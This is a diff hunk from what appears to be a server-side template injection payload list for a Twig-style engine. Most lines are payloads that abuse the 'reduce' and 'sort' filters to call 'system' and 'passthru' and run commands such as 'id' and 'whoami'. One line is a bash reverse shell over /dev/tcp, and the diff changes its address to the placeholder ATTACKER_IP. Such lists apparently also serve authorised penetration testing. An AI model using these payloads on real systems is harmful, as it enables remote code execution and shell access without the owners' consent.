@@ -4,7 +4,7 @@
 {{[0]|reduce('system','id')}}
 {{[0]|reduce('system','whoami')}}
 # Reverse shell:
-{{[0]|reduce('system','bash -c "bash -i >& /dev/tcp/10.0.0.1/443 0>&1"')}}
+{{[0]|reduce('system','bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"')}}
 # === RCE via sort filter ===
 {{['id']|sort('passthru')}}
 {{['whoami']|sort('system')}}
